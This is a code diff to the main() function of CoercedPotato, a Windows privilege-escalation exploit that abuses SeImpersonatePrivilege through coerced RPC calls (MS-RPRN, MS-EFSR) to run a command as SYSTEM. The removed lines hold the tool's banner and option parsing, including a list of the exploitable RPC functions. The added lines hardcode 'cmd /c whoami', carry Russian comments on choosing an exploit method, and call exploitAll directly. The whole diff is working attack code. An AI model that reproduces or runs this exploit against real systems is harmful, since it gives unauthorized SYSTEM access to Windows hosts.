@@ -438,77 +438,21 @@ void exploitAll(wchar_t* command, int exploitId, bool force, std::wstring random
 
 int main(int argc, char** argv)
 {
-    std::cout << "                                                                  " << std::endl;
-    std::cout << "   ____                            _ ____       _        _        " << std::endl;
-    std::cout << "  / ___|___   ___ _ __ ___ ___  __| |  _ \\ ___ | |_ __ _| |_ ___  " << std::endl;
-    std::cout << " | |   / _ \\ / _ \\ '__/ __/ _ \\/ _` | |_) / _ \\| __/ _` | __/ _ \\ " << std::endl;
-    std::cout << " | |__| (_) |  __/ | | (_|  __/ (_| |  __/ (_) | || (_| | || (_) |" << std::endl;
-    std::cout << "  \\____\\___/ \\___|_|  \\___\\___|\\__,_|_|   \\___/ \\__\\__,_|\\__\\___/ " << std::endl;
-    std::cout << "                                                                  " << std::endl;
-    std::cout << "                                           @Hack0ura @Prepouce    " << std::endl;
-    std::cout << "                                                                  " << std::endl;
+    // Установка команды для выполнения с повышенными правами
+    std::wstring command = L"cmd /c whoami";
+    g_pwszCommandLine = const_cast<LPWSTR>(command.c_str());
+    g_bInteractWithConsole = true; // Установите в false, если вы не хотите использовать интерактивный режим
 
-
-    CLI::App app{ "CoercedPotato is an automated tool for privilege escalation exploit using SeImpersonatePrivilege or SeImpersonatePrimaryToken." };
-
-    if (argc == 1) {
-        wprintf(L"Use --help to show all usefull information.\r\n");
-        wprintf(L"[-] Exiting...\r\n");
-        exit(0);
-    }
-
-    std::string stringCommand;
-
-    app.add_option("-c,--command", stringCommand, "Program to execute as SYSTEM (i.e. cmd.exe)")->required();
-
-    std::string rpcInterface;
-    app.add_option("-i,--interface", rpcInterface, "Optionnal interface to use (default : ALL) (Possible values : ms-rprn, ms-efsr");
-
-    int exploitId = -1;
-    app.add_option("-n,--exploitId", exploitId, "Optionnal exploit ID (Only usuable if interface is defined) \n -> ms-rprn : \n   [0] RpcRemoteFindFirstPrinterChangeNotificationEx()\n   [1] RpcRemoteFindFirstPrinterChangeNotification()\n -> ms-efsr \n   [0] EfsRpcOpenFileRaw()\n   [1] EfsRpcEncryptFileSrv()\n   [2] EfsRpcDecryptFileSrv()\n   [3] EfsRpcQueryUsersOnFile()\n   [4] EfsRpcQueryRecoveryAgents()\n   [5] EfsRpcRemoveUsersFromFile()\n   [6] EfsRpcAddUsersToFile()\n   [7] EfsRpcFileKeyInfo() # NOT WORKING\n   [8] EfsRpcDuplicateEncryptionInfoFile()\n   [9] EfsRpcAddUsersToFileEx()\n   [10] EfsRpcFileKeyInfoEx() # NOT WORKING\n   [11] EfsRpcGetEncryptedFileMetadata()\n   [12] EfsRpcEncryptFileExSrv()\n   [13] EfsRpcQueryProtectors()\n");
-
-    bool force = false;
-    app.add_option("-f,--force", force, "Force all RPC functions even if it says 'Exploit worked!' (Default value : false)");
-
-    bool interactive = true;
-    app.add_option("--interactive", interactive, "Set wether the process should be run within the same shell or open a new window. (Default value : true)");
-
-
-    CLI11_PARSE(app, argc, argv);
-
-    const char* charPointer = stringCommand.c_str();
-    size_t maxBufferSize = stringCommand.size() + 1;
-    wchar_t* command = new wchar_t[maxBufferSize];
-    size_t convertedChars = 0;
-    mbstowcs_s(&convertedChars, command, maxBufferSize, charPointer, maxBufferSize - 1);
-
+    // Генерация случайного имени для именованного канала
     std::wstring randomNamedpipe = generateRandomString();
 
-    g_pwszCommandLine = command;
-    g_bInteractWithConsole = interactive;
-
-    if (rpcInterface.empty() and exploitId != -1) {
-        wprintf(L"%d\n", exploitId);
-        wprintf(L"Please use rpcInterface parameter before defining exploitId. \r\n");
-        wprintf(L"[-] Exiting...\r\n");
-        exit(0);
-    }
-
-    if (rpcInterface.empty() and exploitId == -1) {
-        exploitAll(command, exploitId, force, randomNamedpipe);
-        return 0;
-    }
-    else {
-        if (rpcInterface == "ms-rprn") {
-            exploitMsRprn(command, exploitId, force, randomNamedpipe);
-        }
-        else if (rpcInterface == "ms-efsr") {
-            exploitMsEfsr(command, exploitId, force, randomNamedpipe);
-        }
-    }
+    // Выбор метода эксплуатации. В этом примере используется "exploitAll",
+    // который пытается использовать все известные методы эксплуатации.
+    // Вы можете выбрать конкретный метод, например, exploitMsEfsr или exploitMsRprn,
+    // если хотите использовать конкретную уязвимость.
+    exploitAll(const_cast<LPWSTR>(command.c_str()), -1, false, randomNamedpipe);
 
     return 0;
-
 }
 
 
